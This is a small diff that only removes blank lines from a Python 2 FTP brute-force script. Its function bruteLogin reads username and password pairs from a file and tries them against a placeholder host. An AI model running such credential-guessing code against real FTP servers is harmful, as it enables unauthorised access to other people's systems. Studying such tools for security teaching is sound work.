@@ -1,6 +1,5 @@
 import ftplib, time
 
-
 def bruteLogin(hostname, passwdFile):
     pF = open(passwdFile, 'r')
     for line in pF.readlines():
@@ -18,7 +17,6 @@ def bruteLogin(hostname, passwdFile):
             pass
     print '\n[-] Could not brute force FTP credentials.'
     return (None, None)
-
 
 host = '{ADD HOST IP}'
 passwdFile = 'userpass.txt'
